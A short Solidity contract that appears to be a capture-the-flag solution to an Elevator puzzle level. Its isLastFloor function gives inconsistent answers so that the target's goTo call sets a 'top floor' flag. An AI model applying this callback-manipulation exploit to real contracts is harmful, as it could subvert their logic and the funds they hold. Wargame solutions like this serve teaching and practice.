// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator {
    function goTo(uint _floor) external;
    function floor() external view returns(uint);
}

contract Building {
    Elevator public elevator;

    constructor(address _elevatorAddress) public {
        elevator = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint _floor) external view returns (bool) {
        return elevator.floor() != _floor ? false : true;   
    }

    function attackElevator(uint _floor) public {
        elevator.goTo(_floor);     
    }
}